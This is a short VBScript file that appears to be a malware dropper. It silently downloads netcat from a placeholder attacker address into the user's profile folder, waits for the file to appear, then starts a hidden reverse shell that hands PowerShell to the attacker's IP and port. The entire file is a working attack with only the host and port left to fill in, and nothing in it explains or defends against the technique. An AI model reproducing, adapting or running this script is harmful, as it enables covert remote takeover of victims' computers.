Set objShell = CreateObject("Wscript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

downloadCmd = "powershell -WindowStyle Hidden -Command ""(New-Object System.Net.WebClient).DownloadFile('http://{ATTACKER-IP}/nc64.exe', '%USERPROFILE%\nc64.exe')"""
objShell.Run downloadCmd, 0, True
WScript.Sleep 2000 ' Wait for 2 seconds initially (adjust this if needed)

Do While Not objFSO.FileExists(objShell.ExpandEnvironmentStrings("%USERPROFILE%\nc64.exe"))
    WScript.Sleep 1000  ' Wait for 1 second
Loop

execCmd = "cmd /c powershell -WindowStyle Hidden -Command ""Start-Process \""%USERPROFILE%\nc64.exe\"" -ArgumentList '{ATTACKER-IP}', '{PORT}', '-e', 'powershell' -WindowStyle Hidden"""
objShell.Run execCmd, 0, True

Set objFSO = Nothing
Set objShell = Nothing
